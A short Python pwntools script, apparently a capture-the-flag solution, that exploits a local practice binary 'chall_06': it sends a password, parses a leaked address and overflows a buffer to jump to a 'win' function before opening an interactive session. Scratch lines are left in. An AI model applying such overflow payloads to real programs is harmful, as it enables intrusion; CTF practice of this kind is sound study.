from pwn import *

p = process ("./chall_06")

context.arch = "amd64" 
p.recv()
p.sendline("andyrulz")
resp = p.recv()
resp
import re
streeng = re.findall(b"([a-f0-9]{8,16})",resp)[0]
streeng
shellcodeAddr = p64(int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16))

payload = b''
payload+= (0x48-0x10) * b'A' 
elf = ELF("./chall_06") 
payload += p64(elf.sym.win)

p.sendline(payload)

p.interactive()
ls